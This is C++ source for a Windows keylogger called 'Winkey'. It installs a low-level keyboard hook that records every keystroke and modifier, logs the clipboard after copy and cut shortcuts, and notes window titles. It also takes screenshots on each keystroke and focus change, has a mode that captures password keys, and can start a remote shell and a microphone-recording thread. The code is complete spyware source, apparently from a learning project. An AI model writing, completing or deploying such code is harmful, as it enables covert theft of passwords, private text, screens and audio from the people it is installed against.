#include <thread>

#include "config.hpp"
#include "helpers.hpp"
#include "bonus.hpp"

using namespace std::literals;

static HHook hHook;

/* ═════════════════════════════════════════════════════════════════════
   Keyboard Hook Functions
═════════════════════════════════════════════════════════════════════ */

static std::string_view GetSpecialKeyName(DWORD vkCode)
{
    switch (vkCode) {
        case VK_LBUTTON:             return "MouseLeftButton"sv;
        case VK_RBUTTON:             return "MouseRightButton"sv;
        case VK_CANCEL:              return "Cancel"sv;
        case VK_MBUTTON:             return "MouseMiddleButton"sv;
        case VK_XBUTTON1:            return "MouseXButton1"sv;
        case VK_XBUTTON2:            return "MouseXButton2"sv;
        case VK_BACK:                return "\\b"sv;
        case VK_TAB:                 return "\\t"sv;
        case VK_CLEAR:               return "Clear"sv;
        case VK_RETURN:              return "\\n"sv;
        case VK_SHIFT:               return "Shift"sv;
        case VK_CONTROL:             return "Ctrl"sv;
        case VK_MENU:                return "Alt"sv;
        case VK_PAUSE:               return "Pause"sv;
        case VK_CAPITAL:             return "CapsLock"sv;
        case VK_ESCAPE:              return "Esc"sv;
        case VK_PRIOR:               return "PageUp"sv;
        case VK_NEXT:                return "PageDown"sv;
        case VK_END:                 return "End"sv;
        case VK_HOME:                return "Home"sv;
        case VK_LEFT:                return "LeftArrow"sv;
        case VK_UP:                  return "UpArrow"sv;
        case VK_RIGHT:               return "RightArrow"sv;
        case VK_DOWN:                return "DownArrow"sv;
        case VK_SELECT:              return "Select"sv;
        case VK_PRINT:               return "Print"sv;
        case VK_EXECUTE:             return "Execute"sv;
        case VK_SNAPSHOT:            return "PrintScreen"sv;
        case VK_INSERT:              return "Insert"sv;
        case VK_DELETE:              return "Delete"sv;
        case VK_HELP:                return "Help"sv;
        case VK_LWIN:                return "WinL"sv;
        case VK_RWIN:                return "WinR"sv;
        case VK_APPS:                return "Application"sv;
        case VK_SLEEP:               return "Sleep"sv;
        case VK_SEPARATOR:           return "NumpadSeparator"sv;
        case VK_F1:                  return "F1"sv;
        case VK_F2:                  return "F2"sv;
        case VK_F3:                  return "F3"sv;
        case VK_F4:                  return "F4"sv;
        case VK_F5:                  return "F5"sv;
        case VK_F6:                  return "F6"sv;
        case VK_F7:                  return "F7"sv;
        case VK_F8:                  return "F8"sv;
        case VK_F9:                  return "F9"sv;
        case VK_F10:                 return "F10"sv;
        case VK_F11:                 return "F11"sv;
        case VK_F12:                 return "F12"sv;
        case VK_NUMLOCK:             return "NumLock"sv;
        case VK_SCROLL:              return "ScrollLock"sv;
        case VK_BROWSER_BACK:        return "BrowserBack"sv;
        case VK_BROWSER_FORWARD:     return "BrowserForward"sv;
        case VK_BROWSER_REFRESH:     return "BrowserRefresh"sv;
        case VK_BROWSER_STOP:        return "BrowserStop"sv;
        case VK_BROWSER_SEARCH:      return "BrowserSearch"sv;
        case VK_BROWSER_FAVORITES:   return "BrowserFavorites"sv;
        case VK_BROWSER_HOME:        return "BrowserHome"sv;
        case VK_VOLUME_MUTE:         return "VolumeMute"sv;
        case VK_VOLUME_DOWN:         return "VolumeDown"sv;
        case VK_VOLUME_UP:           return "VolumeUp"sv;
        case VK_MEDIA_NEXT_TRACK:    return "MediaNextTrack"sv;
        case VK_MEDIA_PREV_TRACK:    return "MediaPrevTrack"sv;
        case VK_MEDIA_STOP:          return "MediaStop"sv;
        case VK_MEDIA_PLAY_PAUSE:    return "MediaPlayPause"sv;
        case VK_LAUNCH_MAIL:         return "LaunchMail"sv;
        case VK_LAUNCH_MEDIA_SELECT: return "LaunchMediaSelect"sv;
        case VK_LAUNCH_APP1:         return "LaunchApp1"sv;
        case VK_LAUNCH_APP2:         return "LaunchApp2"sv;
        default:                     return {};
    }
}

static void FormatKeyStroke(const DWORD vkCode, const UINT scanCode)
{
    auto fallbackKey = [](const DWORD vk) -> std::string_view {
        static char c;
        if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
            c = static_cast<char>(vk);
            return {&c, 1};
        }
        return {};
    };

    auto isKeyPressed = [](int vk) -> bool { return (GetAsyncKeyState(vk) & 0x8000) != 0; };

    const bool ctrl  = isKeyPressed(VK_CONTROL);
    const bool alt   = isKeyPressed(VK_MENU);
    const bool shift = isKeyPressed(VK_SHIFT);
    const bool win   = isKeyPressed(VK_LWIN) || isKeyPressed(VK_RWIN);

    auto specialKey = GetSpecialKeyName(vkCode);

    const bool hasModifier = ctrl || alt || win || (!specialKey.empty() && shift);
    auto       modifiers   = std::format("{}{}{}{}", ctrl ? "Ctrl+" : "", alt ? "Alt+" : "", shift ? "Shift+" : "", win ? "Win+" : "");

    if (hasModifier) {
        KeyLog("[{}{}]", modifiers, specialKey.empty() ? fallbackKey(vkCode) : specialKey);
    } else if (!specialKey.empty()) {
        KeyLog("[{}]", specialKey);
    } else if (auto keyOutput = TranslateKeyToUtf8(vkCode, scanCode); !keyOutput.empty()) {
        KeyLog("{}", keyOutput);
    }

    if (ctrl && (vkCode == 'C' || vkCode == 'X' || vkCode == VK_INSERT)) {
        std::thread([] {
            std::this_thread::sleep_for(100ms);
            LogClipboardContent();
        }).detach();
    }
}

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) noexcept
{
    if (nCode == HC_ACTION) {
        const auto pKey = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (!IsMonitored<App>(GetActiveProcessName()) || !IsMonitored<User>(GetActiveUsername())) {
                return CallNextHookEx(hHook.get(), nCode, wParam, lParam);
            }

            static std::string lastWindowTitle;
            if (auto currentWindowTitle = GetActiveWindowTitle(); currentWindowTitle != lastWindowTitle) {
                KeyLog("\n{} - '{}' - {}\n", GetTimestamp<LogEntry>(), currentWindowTitle, GetActiveProcessName());
                lastWindowTitle = currentWindowTitle;
                CaptureScreen(true);
            }

            bool capturing = false;
            if (gConfig.MaskedCapture) {
                capturing = HandlePasswordKey(pKey->vkCode, pKey->scanCode);
            }

            if (!capturing) FormatKeyStroke(pKey->vkCode, pKey->scanCode);
            CaptureScreen();
        }
    }
    return CallNextHookEx(hHook.get(), nCode, wParam, lParam);
}

/* ═════════════════════════════════════════════════════════════════════
    Main Function
═════════════════════════════════════════════════════════════════════ */

int main()
{
    static Handle gSingleton(CreateMutex(nullptr, FALSE, "Global\\tinkySingleton"));
    if (!gSingleton || GetLastError() == ERROR_ALREADY_EXISTS) {
        LogErr("Another instance of Winkey is already running. Exiting.");
        return EXIT_FAILURE;
    }

    SetConsoleOutputCP(CP_UTF8);

    if (!gConfig.Init(JoinPath(GetExeDir(), CONFIG_FILE))) {
        return EXIT_FAILURE;
    }

    const DWORD mainTid = GetCurrentThreadId();
    {
        MSG m{};
        PeekMessage(&m, nullptr, 0, 0, PM_NOREMOVE);
    }

    hHook.reset(SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0));
    if (!hHook) return PrintLastError<EXIT_FAILURE>("SetWindowsHookEx");

    Handle stopEvent(OpenEvent(SYNCHRONIZE, FALSE, STOP_EVENT));
    if (!stopEvent) return PrintLastError<EXIT_FAILURE>("OpenEvent");

    std::vector<std::jthread> threads;

    threads.emplace_back([&stopEvent, &mainTid](std::stop_token) {
        WaitForSingleObject(stopEvent.get(), INFINITE);
        PostThreadMessage(mainTid, WM_QUIT, 0, 0);
    });

    if (gConfig.RemoteShell) {
        threads.emplace_back([](std::stop_token st) { LaunchRemoteShell(st); });
    }
    if (gConfig.MicrophoneCapture) {
        threads.emplace_back([](std::stop_token st) { CaptureMicrophone(st); });
    }

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return EXIT_SUCCESS;
}
